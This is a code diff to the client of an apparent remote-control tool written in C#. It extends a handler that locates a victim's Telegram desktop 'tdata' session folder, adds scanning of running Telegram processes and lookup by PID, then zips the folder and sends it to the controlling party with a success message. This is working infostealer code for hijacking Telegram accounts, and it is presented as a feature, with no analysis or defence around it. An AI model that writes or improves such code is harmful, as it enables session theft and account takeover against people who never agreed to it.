@@ -1,4 +1,5 @@
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
 using System.Collections.Generic;
@@ -18,27 +19,21 @@ namespace RemoteControl.Client.Handlers
                 try
                 {
                     var req = reqObj as RequestTGExtract;
-                    string tdataPath = FindTdataPath();
+                    int mode = (req != null) ? req.Mode : 0;
 
-                    if (string.IsNullOrEmpty(tdataPath) || !Directory.Exists(tdataPath))
+                    if (mode == 2)
                     {
-                        var respNotFound = new ResponseTGExtract();
-                        respNotFound.Result = false;
-                        respNotFound.Found = false;
-                        respNotFound.Message = "未找到Telegram tdata目录";
-                        session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, respNotFound);
-                        return;
+                        // 仅扫描进程模式
+                        HandleScanProcesses(session);
                     }
-
-                    byte[] packData = PackTdata(tdataPath);
-
-                    var resp = new ResponseTGExtract();
-                    resp.Result = true;
-                    resp.Found = true;
-                    resp.TdataZip = packData;
-                    resp.FileName = Environment.MachineName + "_tdata.dat";
-                    resp.Message = "TG数据提取成功";
-                    session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, resp);
+                    else
+                    {
+                        // 提取模式
+                        string targetPath = (req != null && !string.IsNullOrEmpty(req.TargetPath))
+                            ? req.TargetPath : null;
+                        int targetPid = (req != null) ? req.TargetPid : 0;
+                        HandleExtract(session, targetPath, targetPid);
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -48,6 +43,94 @@ namespace RemoteControl.Client.Handlers
                     session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, resp);
                 }
             });
+        }
+
+        private void HandleScanProcesses(SocketSession session)
+        {
+            var resp = new ResponseTGExtract();
+            resp.Result = true;
+
+            // 扫描运行中的Telegram进程
+            var processList = new List<string>();
+            try
+            {
+                var procs = Process.GetProcessesByName("Telegram");
+                foreach (var proc in procs)
+                {
+                    string exePath = "";
+                    try { exePath = proc.MainModule.FileName; } catch { }
+                    string tdataDir = "";
+                    if (!string.IsNullOrEmpty(exePath))
+                    {
+                        string parentDir = Path.GetDirectoryName(exePath);
+                        string td = Path.Combine(parentDir, "tdata");
+                        if (Directory.Exists(td)) tdataDir = td;
+                    }
+                    processList.Add(string.Format("{0}|{1}|{2}|{3}",
+                        proc.Id, proc.ProcessName, exePath, tdataDir));
+                }
+            }
+            catch { }
+
+            // 同时检查常见位置的tdata目录
+            string foundTdata = FindTdataPath();
+
+            resp.Found = (processList.Count > 0 || !string.IsNullOrEmpty(foundTdata));
+            resp.ProcessInfoList = processList.ToArray();
+            resp.TdataPath = foundTdata ?? "";
+            resp.Message = string.Format("找到 {0} 个TG进程, tdata路径: {1}",
+                processList.Count, string.IsNullOrEmpty(foundTdata) ? "未找到" : foundTdata);
+
+            session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, resp);
+        }
+
+        private void HandleExtract(SocketSession session, string targetPath, int targetPid)
+        {
+            string tdataPath = null;
+
+            // 按指定路径
+            if (!string.IsNullOrEmpty(targetPath) && Directory.Exists(targetPath))
+            {
+                tdataPath = targetPath;
+            }
+            // 按PID定位tdata
+            else if (targetPid > 0)
+            {
+                try
+                {
+                    var proc = Process.GetProcessById(targetPid);
+                    string exePath = proc.MainModule.FileName;
+                    string parentDir = Path.GetDirectoryName(exePath);
+                    string td = Path.Combine(parentDir, "tdata");
+                    if (Directory.Exists(td)) tdataPath = td;
+                }
+                catch { }
+            }
+
+            // 自动搜索
+            if (string.IsNullOrEmpty(tdataPath))
+                tdataPath = FindTdataPath();
+
+            if (string.IsNullOrEmpty(tdataPath) || !Directory.Exists(tdataPath))
+            {
+                var respNotFound = new ResponseTGExtract();
+                respNotFound.Result = false;
+                respNotFound.Found = false;
+                respNotFound.Message = "未找到Telegram tdata目录";
+                session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, respNotFound);
+                return;
+            }
+
+            byte[] packData = PackTdata(tdataPath);
+
+            var resp = new ResponseTGExtract();
+            resp.Result = true;
+            resp.Found = true;
+            resp.TdataZip = packData;
+            resp.TdataPath = tdataPath;
+            resp.FileName = Environment.MachineName + "_tdata.dat";
+            resp.Message = "TG数据提取成功";
+            session.Send(ePacketType.PACKET_TG_EXTRACT_RESPONSE, resp);
         }
 
         private string FindTdataPath()
